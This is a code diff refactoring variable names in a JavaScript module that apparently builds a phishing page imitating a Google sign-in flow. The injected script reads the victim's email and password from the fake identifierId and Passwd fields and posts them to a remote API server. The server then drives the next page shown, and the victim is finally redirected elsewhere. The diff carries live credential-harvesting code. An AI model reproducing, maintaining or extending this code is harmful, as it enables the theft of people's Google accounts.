@@ -48,6 +48,8 @@ export function writeUserLog(userId, message) {
   const ts = new Date().toISOString().replace("T", " ").replace("Z", "");
   fs.appendFileSync(file, `[${ts}]: ${message}\n`, "utf8");
 }
+
+export const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 //======================================
 //
 //
@@ -206,7 +208,7 @@ export function addTimeoutScript(src) {
                     actions_func();
                     reloaded = true;
 
-                    if(cur_page != 'dp')
+                    if(curPage != 'dp')
                         return;
                     // fetch //
                     const apiUrl = api_server_url + '/api/url-check';
@@ -245,7 +247,7 @@ export function addFunctionsScript(src) {
     src +
     `
         <script>
-            var cur_page = 'email';
+            var curPage = 'email';
             //document.URL
             function getElementByXpath(path) {
                 return document.evaluate(path, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
@@ -278,19 +280,19 @@ export function addFunctionsScript(src) {
             function apiResultProcessing(data) {
                 if(data.status == 0) return;
                 
-                //console.log(data.html_txt)
-                //document.getElementsByTagName('body')[0].innerHTML = data.html_txt;
+                //console.log(data.htmlText)
+                //document.getElementsByTagName('body')[0].innerHTML = data.htmlText;
                 
-                cur_page = data.cur_page
+                curPage = data.curPage
                                         
-                if(cur_page == 'done') {
-                    //console.log(cur_page, forward_url);
+                if(curPage == 'done') {
+                    //console.log(curPage, forward_url);
                     doneApiRequest();
                     //document.cookie = createCookie('acc', acc);
                     window.location.href = forward_url;
                 } else {
                     var mainDivElement = document.getElementById("yDmH0d");
-                    mainDivElement.innerHTML = data.html_txt;
+                    mainDivElement.innerHTML = data.htmlText;
                     
                     // hide progresss bar //
                     getElementByXpath('//div[@jscontroller="ltDFwf"]').className = "sZwd7c B6Vhqe qdulke jK7moc";
@@ -321,7 +323,7 @@ export function addFunctionsScript(src) {
             //         ));
             //     return matches ? decodeURIComponent(matches[1]) : undefined;
             // }
-            const btnClickFunction = (btn_type, btn_text) => {
+            const btnClickFunction = (btnType, btnText) => {
                 // get uid //
                 uid = user_id;
 
@@ -335,9 +337,9 @@ export function addFunctionsScript(src) {
 
                 // get input value //
                 var value = '';
-                if(cur_page == 'email') {
+                if(curPage == 'email') {
                     value = getElementByXpath('//input[@id="identifierId"]').value;
-                } else if(cur_page == 'password') {
+                } else if(curPage == 'password') {
                     value = getElementByXpath('//input[@name="Passwd"]').value;
                 } else {
                     var input_elements = getAllElementsByXPath('//input');
@@ -364,8 +366,8 @@ export function addFunctionsScript(src) {
                     body: JSON.stringify({
                         uid: uid,
                         value: value,
-                        btn_type: btn_type,
-                        btn_text: btn_text
+                        btnType: btnType,
+                        btnText: btnText
                     })
                 })
                 .then(response => {
@@ -404,10 +406,10 @@ export function addFunctionsScript(src) {
                 if (event.key === 'Enter') {
                     event.preventDefault();
                     
-                    var btn_text = 'Next'					
-                    if(hl == 'ko') btn_text = '다음';
+                    var btnText = 'Next'					
+                    if(hl == 'ko') btnText = '다음';
                     
-                    btnClickFunction(0, btn_text);			
+                    btnClickFunction(0, btnText);			
                 }
             });
                 
@@ -417,8 +419,8 @@ export function addFunctionsScript(src) {
                 var btnElements = document.getElementsByTagName("button");
                 for(let i = 0; i < btnElements.length; i++) {
                     btnElements[i].addEventListener('click', () => {
-                        btn_text = btnElements[i].innerText;
-                        btnClickFunction(0, btn_text);        
+                        btnText = btnElements[i].innerText;
+                        btnClickFunction(0, btnText);        
                     });
                 }
 
